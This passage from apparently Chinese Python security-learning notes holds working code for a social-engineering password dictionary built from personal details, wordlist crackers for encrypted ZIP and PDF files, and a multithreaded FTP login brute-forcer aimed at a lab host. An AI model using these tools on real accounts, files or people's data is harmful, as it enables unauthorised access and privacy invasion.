class="hljs-string">&#x27;&#x27;</span>.join(password)<br>        passwords.append(password)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;密码生成器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s 密码生成器&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-l&quot;</span>,<span class="hljs-string">&quot;--lowercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含小写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>,<span class="hljs-string">&quot;--uppercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含大写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-n&quot;</span>,<span class="hljs-string">&quot;--numbers&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含数字的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-s&quot;</span>,<span class="hljs-string">&quot;--special_chars&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含特殊字符的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--total-length&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码的总长度&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    <span class="hljs-comment">#parser.add_argument(&quot;-nu&quot;,&quot;--number&quot;,default=0,help=&quot;生成密码的数量&quot;,type=int)</span><br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--amount&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;生成密码的数量&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>,<span class="hljs-string">&quot;--output_file&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出到文本文件&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-comment"># print(string.digits)</span><br><span class="hljs-comment"># print(string.ascii_lowercase)</span><br><span class="hljs-comment"># print(string.ascii_uppercase)</span><br><span class="hljs-comment"># print(string.punctuation)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取参数</span><br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.total_length:<br>        <span class="hljs-comment">#指定了密码长度--完全随机</span><br>        createRandomPWD(args)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment">#未指定密码长度，自定义密码构成（数字、大小写字母、特殊字符的个数）</span><br>        createArgumentPWD(args)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br>    <span class="hljs-comment">#写入文本</span><br>    <span class="hljs-keyword">if</span> args.output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.output_file,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br></code></pre></td></tr></table></figure><p>待优化 </p><h2 id="社工字典生成器"><a href="#社工字典生成器" class="headerlink" title="社工字典生成器"></a>社工字典生成器</h2><p>收集个人、厂商等信息之后  社工字典就是根据这些信息组合生成密码</p><p>例如：姓名+生日    姓名+手机   身份证+昵称   等等</p><h3 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h3><p><a href="https://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器 | 菜鸟教程 (runoob.com)</a></p><p><img src="/img/image-20230917175539938-1701333286922-13.png" alt="image-20230917175539938"></p><h3 id="itertools模块"><a href="#itertools模块" class="headerlink" title="itertools模块"></a>itertools模块</h3><p><a href="https://docs.python.org/zh-cn/3/library/itertools.html">itertools — 为高效循环而创建迭代器的函数 — Python 3.11.5 文档</a></p><p><img src="/img/image-20230917195100206-1701333286922-15.png" alt="image-20230917195100206"></p><p><img src="/img/image-20230917195113600-1701333286922-12.png" alt="image-20230917195113600"></p><p>实现原理（可扩充  例如位数可自行设置）：</p><p>1.信息长度大于等于8位的直接写入  </p><p>2.没到8位的拼接数字到8位  </p><p>3.两两组合做笛卡尔积  </p><p>4.前中后拼接特殊字符做笛卡尔积</p><p>个人信息示例：</p><p><img src="/img/image-20230922171702544-1701333286922-14.png" alt="image-20230922171702544"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment">#存放生成的密码</span><br>dictionaryFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><br><span class="hljs-comment">#获取个人信息存到列表中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readInformationList</span>():<br>    infoList = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#读取个人信息文件</span><br>        info = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;info.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        lines = info.readlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>            <span class="hljs-built_in">print</span>(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            infoList.append(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件读取错误&quot;</span>)<br>    <span class="hljs-keyword">return</span> infoList<br><br><span class="hljs-comment">#数字组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createNumberList</span>():<br>    numberList = []<br>    words = string.digits   <span class="hljs-comment">#0123456789</span><br>    <span class="hljs-comment">#itertools.product做笛卡尔积</span><br>    itertoolsNumberList = itertools.product(words,repeat=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> itertoolsNumberList:<br>        numberList.append(<span class="hljs-string">&quot;&quot;</span>.join(number))<br>    <span class="hljs-keyword">return</span> numberList<br><br><span class="hljs-comment">#特殊字符组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createSpecialList</span>():<br>    specialList = []<br>    specialWords = string.punctuation   <span class="hljs-comment">#!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> specialWords:<br>        specialList.append(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>    <span class="hljs-keyword">return</span> specialList<br><br><span class="hljs-comment">#混合组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Combination</span>():<br>    infoList = readInformationList()<br>    infoLen = <span class="hljs-built_in">len</span>(infoList)<br>    specialList = createSpecialList()   <span class="hljs-comment">#特殊字符</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(infoLen):<br>        <span class="hljs-comment">#把个人信息大于等于8位的输出到文件  因为可能直接用来当密码</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]) &gt;= <span class="hljs-number">8</span>:<br>            <span class="hljs-comment">#print(infoList[a])</span><br>            dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#不到8位的填充到8位</span><br>        <span class="hljs-keyword">else</span>:<br>            needWords = <span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(infoList[a])<br>            <br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> itertools.permutations(string.digits,needWords):<br>                <span class="hljs-comment">#print(b)</span><br>                <span class="hljs-comment">#print(infoList[a]+&quot;&quot;.join(b))</span><br>                dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;&quot;</span>.join(b)+<span class="hljs-string">&quot;\n&quot;</span>)<br>            <span class="hljs-comment">#dictionaryFile.write(infoList[a]+&quot;&quot;.join(b)+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#将信息各元素两两拼接</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+infoList[c]) &gt;= <span class="hljs-number">8</span>:<br>                <span class="hljs-comment">#print(infoList[a]+infoList[c])</span><br>                dictionaryFile.write(infoList[a]+infoList[c]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#拼接特殊字符</span><br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(specialList)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+specialList[e]+infoList[d]) &gt;= <span class="hljs-number">8</span>:<br>                    <span class="hljs-comment">#特殊字符加尾部</span><br>                    <span class="hljs-comment">#print(infoList[a]+infoList[d]+specialList[e])</span><br>                    dictionaryFile.write(infoList[a]+infoList[d]+specialList[e]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加中间</span><br>                    <span class="hljs-comment">#print(infoList[a]+specialList[e]+infoList[d])</span><br>                    dictionaryFile.write(infoList[a]+specialList[e]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加前面</span><br>                    <span class="hljs-comment">#print(specialList[e]+infoList[a]+infoList[d])</span><br>                    dictionaryFile.write(specialList[e]+infoList[a]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">startSocialDict</span>():<br>    Combination()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    startSocialDict()<br></code></pre></td></tr></table></figure><p>集成到密码生成器中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> social_dict  <span class="hljs-comment">#引入生成社工字典的函数</span><br><span class="hljs-comment">#添加参数</span><br>parser.add_argument(<span class="hljs-string">&quot;-so&quot;</span>,<span class="hljs-string">&quot;--social_dict&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出社工字典&quot;</span>)<br><span class="hljs-comment">#调用</span><br><span class="hljs-keyword">if</span> args.social_file:<br>   social_dict.startSocialDict()<br></code></pre></td></tr></table></figure><h2 id="zip和pdf密码破解"><a href="#zip和pdf密码破解" class="headerlink" title="zip和pdf密码破解"></a>zip和pdf密码破解</h2><p>原理：密码爆破 </p><p>使用tqdm模块（打印进度条） </p><p>zipfile模块(处理zip文件)</p><p>坑点：</p><p>[解决Python Zipfile 压缩方法无法解压密码文件_zipcrypto-CSDN博客](<a href="https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request_id%22:%22169512681716800182182134%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169512681716800182182134&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142%5Ev94%5Einsert_down28v1&utm_term=%E8%A7%A3%E5%86%B3python">https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request%5Fid%22%3A%22169512681716800182182134%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169512681716800182182134&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142^v94^insert_down28v1&amp;utm_term=解决python</a> zipfile 压缩方法无法解压密码文件&amp;spm&#x3D;1018.2226.3001.4187)</p><p><img src="/img/image-20230919203402127-1701333286922-18.png" alt="image-20230919203402127"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<span class="hljs-comment">#打印进度条</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> pyzipper<br><br>passwordfile = <span class="hljs-string">&quot;password1.txt&quot;</span><br>zip_file = <span class="hljs-string">&quot;secret.zip&quot;</span> <br><span class="hljs-comment"># zip_file = zipfile.ZipFile(zip_file)</span><br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># zip_file.extractall(pwd=pwd)</span><br>            <span class="hljs-comment">#使用pyzipper库用密码读取zip文件</span><br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file, <span class="hljs-string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="hljs-keyword">as</span> extracted_zip:<br>                extracted_zip.extractall(pwd=<span class="hljs-built_in">str</span>.encode(pwd))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found:&quot;</span>,word.decode().strip())<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br><span class="hljs-comment"># </span><br><br><span class="hljs-comment"># zip_file.extractall(pwd=&quot;123456&quot;.encode(&quot;utf-8&quot;))</span><br><span class="hljs-comment"># import pyzipper</span><br><br><span class="hljs-comment"># password = &#x27;123456&#x27;</span><br><br><span class="hljs-comment"># with pyzipper.AESZipFile(&quot;ppkke.zip&quot;, &#x27;r&#x27;, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as extracted_zip:</span><br><span class="hljs-comment">#     extracted_zip.extractall(pwd=str.encode(password))</span><br><br></code></pre></td></tr></table></figure><p>pdf破解</p><p>依赖库：pip install pikepdf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> pikepdf<br><br>passwordfile = <span class="hljs-string">&quot;PasswordFile.txt&quot;</span><br>pdf_file = <span class="hljs-string">&quot;a.pdf&quot;</span> <br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment">#使用pikepdf库读取pdf文件</span><br>            <span class="hljs-keyword">with</span> pikepdf.<span class="hljs-built_in">open</span>(pdf_file,password=pwd) <span class="hljs-keyword">as</span> pdf:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [+] password found:&quot;</span>+pwd)<br>                exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">except</span> pikepdf._core.PasswordError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h2><p>centos FTP服务配置：<a href="https://blog.csdn.net/tangyin09/article/details/131361557">在Centos 7使用FTP服务_centos7 ftp_tangyin09的博客-CSDN博客</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">查看ftp服务是否开启<span class="hljs-symbol">:netstat</span> -anput<br>systemctl status vsftpd<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921154158623-1701333286922-16.png" alt="image-20230921154158623"></p><p>使用ftpzilla连接测试</p><p><img src="/img/image-20230921155519479-1701333286922-19.png" alt="image-20230921155519479"></p><p>使用模块：ftplib</p><p>连接失败原因：[Python操作FTP时，TimeoutError: <a href="https://www.cnblogs.com/txmblog/p/12955615.html">WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 FTPIT技术疑难杂症 - 唐小沫 - 博客园 (cnblogs.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#队列</span><br>q = queue.Queue()<br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ftp</span>():<br>    <span class="hljs-comment">#获取密码</span><br>    password = q.get()<br>    ftp_client = ftplib.FTP()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] trying&quot;</span>,password)<br>    <span class="hljs-keyword">try</span>:<br>        ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">10</span>)<br>        ftp_client.login(user=user,passwd=password)<br>    <span class="hljs-keyword">except</span> ftplib.error_perm:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;password found :&quot;</span>,password)<br>        ftp_client.quit()<br>        <span class="hljs-keyword">with</span> q.mutex:<br>            q.queue.clear()<br>            q.all_tasks_done.notify_all()<br>            q.unfinished_tasks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">try</span>:<br>            q.task_done()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-comment">#将密码传入队列</span><br>    q.put(password)<br><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>    thread = Thread(target=connect_ftp)<br>    thread.daemon = <span class="hljs-literal">True</span><br>    thread.start()<br><br>q.join()<br><br></code></pre></td></tr></table></figure><p>v2版本  采用传统多线程 与端口扫描的一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-comment">#from multiprocessing import Queue</span><br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ftp_crack</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span 